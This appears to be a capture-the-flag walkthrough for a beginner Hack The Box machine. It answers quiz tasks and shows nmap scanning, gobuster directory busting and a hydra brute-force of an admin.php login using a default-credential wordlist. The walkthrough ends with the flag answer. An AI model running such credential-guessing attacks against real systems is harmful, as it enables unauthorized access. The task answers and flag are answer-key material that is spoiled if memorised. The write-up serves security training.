# Preignition

- **Category**: Starting Point - Tier 0
- **Difficulty**: Very Easy
- **Tags**: Web, Custom Applications, Apache, Reconnaissance, Web Site Structure Discovery, Default Credentials
- **Tools**: nmap, gobuster


# Walkthrough

## Task 1: Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking.

> **Answer**: dir busting

## Task 2: What switch do we use for nmap's scan to specify that we want to perform version detection

> **Answer**: -sV

## Task 3: What does Nmap report is the service identified as running on port 80/tcp?

```bash
> nmap -sV -p 80 10.129.199.239
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 13:07 AEST
Nmap scan report for 10.129.199.239
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
```

> **Answer**: http

## Task 4: What server name and version of service is running on port 80/tcp?

> **Answer**: nginx 1.14.2

## Task 5: What switch do we use to specify to Gobuster we want to perform dir busting specifically?

> **Answer**: dir

## Task 6: When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages?

> **Answer**: -x php

## Task 7: What page is found during our dir busting activities?

```bash
> gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.129.199.239 -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.199.239
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/11 13:11:36 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 999]
```

> **Answer**: admin.php

## Task 8: What is the HTTP status code reported by Gobuster for the discovered page?

> **Answer**: 200

# Submit Root Flag

We can try some basic default credentials here using `hydra`. `hydra` is a very fast network logon cracker which supports many different services.
For this we need a wordlist to supply `hydra` with the username + passwords. You can find wordlists online or generate your own as is done in the steps below.

- **NOTE**: You can follow this [tutorial](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/) to learn how to find the correct post-form details.

```bash
# Generate a basic wordlist
> cat << EOF > wordlist.txt
admin:password
root:root
root:admin
user:user
user:password
admin:admin
EOF

# Find the Post-Form details
# Running a failed login against the site whilst viewing the network tab in the developer console shows us
# that the post-form details we require are as follows:
# URL: http://10.129.199.239/admin.php
# Method: POST
# Form Data: { "username": "<USER>", "password": "<PASS>" }
# NOTE: You can also use BurpSuite to find this

# Run hydra against the target server
# We can use the `-C` flag to tell hydra we're passing it a username:password list
# We provide the 'Wrong username or password' string which the site presents in the case of an invalid password
> hydra -C wordlist.txt 10.129.199.239 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong username or password"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-11 13:44:49
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries, ~1 try per task
[DATA] attacking http-post-form://10.129.199.239:80/admin.php:username=^USER^&password=^PASS^:Wrong username or password

[80][http-post-form] host: 10.129.199.239   login: admin   password: admin

1 of 1 target successfully completed, 1 valid password found

```

> **Answer**: 6483bee07c1c1d57f14e5b0717503c73

